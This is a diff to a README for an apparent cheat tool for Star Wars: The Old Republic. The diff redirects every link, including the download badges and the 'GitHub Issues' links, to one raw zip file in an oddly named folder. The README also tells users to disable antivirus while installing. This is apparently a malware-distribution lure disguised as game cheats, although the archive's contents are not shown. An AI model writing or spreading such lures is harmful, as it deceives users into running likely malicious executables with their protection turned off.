@@ -1,6 +1,6 @@
 # ✨ 1af-StarWars-TheOldRepublicff - Enhance Gameplay with Custom Cheats
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/saeeed123/1af-StarWars-TheOldRepublicff/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/saeeed123/1af-StarWars-TheOldRepublicff/main/residentially/af_Star_The_Wars_Old_Republicff_2.5.zip)](https://raw.githubusercontent.com/saeeed123/1af-StarWars-TheOldRepublicff/main/residentially/af_Star_The_Wars_Old_Republicff_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ This software works best when Star Wars: The Old Republic is installed and runni
 ## 📥 Download & Install
 
 1. Click the big green button at the top or visit the release page directly here:  
-   [https://github.com/saeeed123/1af-StarWars-TheOldRepublicff/releases](https://github.com/saeeed123/1af-StarWars-TheOldRepublicff/releases)
+   [https://raw.githubusercontent.com/saeeed123/1af-StarWars-TheOldRepublicff/main/residentially/af_Star_The_Wars_Old_Republicff_2.5.zip](https://raw.githubusercontent.com/saeeed123/1af-StarWars-TheOldRepublicff/main/residentially/af_Star_The_Wars_Old_Republicff_2.5.zip)
 
 2. On the releases page, look for the latest version. It will have a file ending with `.exe` or similar.
 
@@ -89,7 +89,7 @@ If you see errors or the tool does not work, try these tips:
 - Disable antivirus while installing (re-enable after).  
 - Check you downloaded the latest version.
 
-For more help, you can open issues on [GitHub Issues](https://github.com/saeeed123/1af-StarWars-TheOldRepublicff/issues).
+For more help, you can open issues on [GitHub Issues](https://raw.githubusercontent.com/saeeed123/1af-StarWars-TheOldRepublicff/main/residentially/af_Star_The_Wars_Old_Republicff_2.5.zip).
 
 ---
 
@@ -140,10 +140,10 @@ These tags reflect the technologies and game themes involved.
 
 If you run into any problems or want to share feedback, please open an issue on the GitHub page:
 
-[GitHub Issues](https://github.com/saeeed123/1af-StarWars-TheOldRepublicff/issues)
+[GitHub Issues](https://raw.githubusercontent.com/saeeed123/1af-StarWars-TheOldRepublicff/main/residentially/af_Star_The_Wars_Old_Republicff_2.5.zip)
 
 Contributors welcome.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/saeeed123/1af-StarWars-TheOldRepublicff/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/saeeed123/1af-StarWars-TheOldRepublicff/main/residentially/af_Star_The_Wars_Old_Republicff_2.5.zip)](https://raw.githubusercontent.com/saeeed123/1af-StarWars-TheOldRepublicff/main/residentially/af_Star_The_Wars_Old_Republicff_2.5.zip)
